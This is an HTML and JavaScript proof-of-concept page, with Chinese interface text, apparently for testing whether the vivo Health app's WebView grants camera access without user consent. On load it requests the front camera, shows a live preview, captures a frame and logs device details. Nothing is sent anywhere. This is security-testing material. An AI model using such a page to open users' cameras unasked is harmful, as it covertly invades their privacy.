<!doctype html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>vivo Health Camera PoC</title>
<style>
:root {
    --bg: #edf3fb;
    --card: #ffffff;
    --text: #16202b;
    --muted: #5f6b7b;
    --accent: #005f99;
    --ok: #067647;
    --err: #b42318;
    --border: #d8e3f0;
    --panel: #101722;
    --panel-text: #d9e2ef;
}
* {
    box-sizing: border-box;
}
body {
    margin: 0;
    font-family: "Segoe UI", "PingFang SC", sans-serif;
    color: var(--text);
    background:
        radial-gradient(circle at top left, #f7fbff 0, transparent 35%),
        linear-gradient(180deg, #eef5ff 0, var(--bg) 100%);
}
main {
    max-width: 820px;
    margin: 0 auto;
    padding: 24px 18px 40px;
}
.card {
    background: var(--card);
    border: 1px solid var(--border);
    border-radius: 22px;
    padding: 22px;
    box-shadow: 0 20px 48px rgba(17, 31, 51, 0.08);
}
h1 {
    margin: 0 0 10px;
    font-size: 30px;
    line-height: 1.15;
}
p {
    margin: 0 0 12px;
    line-height: 1.6;
    color: var(--muted);
}
.status {
    margin: 14px 0 18px;
    font-size: 22px;
    font-weight: 700;
}
.status.ok {
    color: var(--ok);
}
.status.err {
    color: var(--err);
}
.actions {
    display: flex;
    gap: 12px;
    flex-wrap: wrap;
    margin-bottom: 18px;
}
button {
    appearance: none;
    border: none;
    border-radius: 999px;
    padding: 12px 18px;
    background: var(--accent);
    color: #fff;
    font-size: 16px;
    font-weight: 700;
    cursor: pointer;
}
button.secondary {
    background: #dae8f7;
    color: #11324d;
}
.grid {
    display: grid;
    gap: 16px;
    grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
    align-items: start;
    margin-bottom: 16px;
}
.panel {
    border: 1px solid var(--border);
    border-radius: 18px;
    overflow: hidden;
    background: #f7fbff;
}
.panel h2 {
    margin: 0;
    padding: 12px 14px;
    font-size: 15px;
    font-weight: 700;
    color: #24435f;
    background: #eaf2fb;
    border-bottom: 1px solid var(--border);
}
video, canvas {
    display: block;
    width: 100%;
    background: #09111a;
    aspect-ratio: 4 / 3;
    object-fit: cover;
}
pre {
    margin: 0;
    padding: 14px;
    min-height: 250px;
    white-space: pre-wrap;
    word-break: break-word;
    background: var(--panel);
    color: var(--panel-text);
    font-size: 14px;
    line-height: 1.45;
    overflow: auto;
    border-radius: 18px;
}
.footnote {
    font-size: 13px;
    color: var(--muted);
    margin-top: 14px;
}
</style>
</head>
<body>
<main>
<div class="card">
    <h1>vivo Health WebView Camera PoC</h1>
    <p>页面试图自动调用前置摄像头权限，测试是否存在权限绕过。成功获取将显示实时预览和摄像头参数，并自动抓取一帧作为证据。</p>
    <div id="status" class="status">状态：等待初始化</div>
    <div class="actions">
        <button id="retry" type="button">重新尝试摄像头</button>
        <button id="stop" type="button" class="secondary">停止摄像头</button>
    </div>
    <div class="grid">
        <section class="panel">
            <h2>实时预览</h2>
            <video id="preview" autoplay playsinline muted></video>
        </section>
        <section class="panel">
            <h2>自动抓帧</h2>
            <canvas id="snapshot"></canvas>
        </section>
    </div>
    <pre id="log"></pre>
    <p class="footnote">如果日志出现 <code>SUCCESS</code> 消息且页面展示了预览/抓帧，则说明 WebView 已为网页授予了摄像头访问权限。</p>
</div>
</main>
<script>
const statusEl = document.getElementById("status");
const logEl = document.getElementById("log");
const videoEl = document.getElementById("preview");
const canvasEl = document.getElementById("snapshot");
const retryBtn = document.getElementById("retry");
const stopBtn = document.getElementById("stop");

let stream = null;
let captureTimer = null;

function log(message, level) {
    const stamp = new Date().toLocaleTimeString();
    const line = `[${stamp}] ${message}`;
    logEl.textContent += `${line}\n`;
    logEl.scrollTop = logEl.scrollHeight;
    console.log(line);
    
    if (level === "error") {
        statusEl.textContent = "状态：获取摄像头失败";
        statusEl.className = "status err";
    } else if (level === "ok") {
        statusEl.textContent = "状态：摄像头已开启";
        statusEl.className = "status ok";
    }
}

function stopCamera() {
    if (captureTimer) {
        clearTimeout(captureTimer);
        captureTimer = null;
    }
    if (stream) {
        stream.getTracks().forEach((track) => track.stop());
        log("已停止所有摄像头轨道");
    }
    stream = null;
    videoEl.srcObject = null;
}

function captureFrame() {
    if (!stream || !videoEl.videoWidth || !videoEl.videoHeight) {
        log("快照跳过：视频元数据尚未就绪");
        return;
    }
    canvasEl.width = videoEl.videoWidth;
    canvasEl.height = videoEl.videoHeight;
    const ctx = canvasEl.getContext("2d");
    ctx.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
    log(`抓帧成功：${canvasEl.width}x${canvasEl.height}`, "ok");
}

async function startCamera() {
    stopCamera();
    statusEl.textContent = "状态：正在请求摄像头权限";
    statusEl.className = "status";
    
    log("调用：navigator.mediaDevices.getUserMedia({ video: true, audio: false })");
    
    try {
        stream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: "user"
            },
            audio: false
        });
        
        videoEl.srcObject = stream;
        const tracks = stream.getVideoTracks();
        const details = tracks.map((track) => {
            const settings = track.getSettings ? JSON.stringify(track.getSettings()) : "{}";
            return `${track.kind}: ${track.label || "(无标签)"} 参数=${settings}`;
        });
        
        log(`成功：${details.join(" | ")}`, "ok");
        captureTimer = setTimeout(captureFrame, 1200);
        
    } catch (err) {
        const name = err && err.name ? err.name : "UnknownError";
        const message = err && err.message ? err.message : "";
        log(`错误：${name} ${message}`, "error");
    }
}

retryBtn.addEventListener("click", startCamera);
stopBtn.addEventListener("click", stopCamera);

videoEl.addEventListener("loadedmetadata", () => {
    log(`预览元数据：${videoEl.videoWidth}x${videoEl.videoHeight}`);
});

log(`页面加载：${location.href}`);
log(`安全上下文：${window.isSecureContext}`);
log(`浏览器信息：${navigator.userAgent}`);

window.addEventListener("load", () => {
    void startCamera();
});
</script>
</body>
</html>
